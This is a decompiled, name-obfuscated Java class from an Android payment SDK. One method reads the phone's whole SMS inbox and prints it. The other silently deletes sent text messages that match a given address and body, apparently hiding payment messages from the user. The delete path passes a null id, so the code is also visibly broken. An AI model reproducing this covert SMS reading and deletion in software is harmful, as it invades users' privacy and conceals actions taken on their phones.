package com.codapayments.sdk.c;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import com.facebook.internal.ServerProtocol;

/* loaded from: classes.dex */
public final class k {
    private static int a = 1;
    private static int b = 2;
    private static int c = 3;

    private static void a(ContentResolver contentResolver) {
        Cursor cursorQuery = contentResolver.query(Uri.parse("content://sms/"), new String[]{"_id", "address", "body", ServerProtocol.DIALOG_PARAM_TYPE}, null, null, null);
        String str = "";
        while (cursorQuery.moveToNext()) {
            str = String.valueOf(str) + cursorQuery.getString(3) + ", ";
        }
        System.out.println("sms : \n\n\n" + str);
        System.out.println("\n\n\nfirstId : " + ((String) null));
        cursorQuery.close();
    }

    public static void a(ContentResolver contentResolver, String str, String str2) {
        Cursor cursorQuery = contentResolver.query(Uri.parse("content://sms/sent"), new String[]{"_id", "address", "body"}, null, null, null);
        while (cursorQuery.moveToNext()) {
            String string = cursorQuery.getString(0);
            String string2 = cursorQuery.getString(1);
            String string3 = cursorQuery.getString(2);
            if (str.equals(string2) && str2.equals(string3)) {
                int iDelete = contentResolver.delete(Uri.parse("content://sms/" + ((String) null)), null, null);
                if (iDelete > 0) {
                    Log.i(f.K, new StringBuffer("Deleted SMS : ID :").append(string).append(" To :").append(string2).append(" : ").append(string3).toString());
                } else {
                    Log.i(f.K, new StringBuffer("SMS not Deleted : ID :").append(string).append(" To :").append(string2).append(" : ").append(string3).toString());
                }
                System.out.println("Count : " + iDelete);
            }
        }
        cursorQuery.close();
    }
}
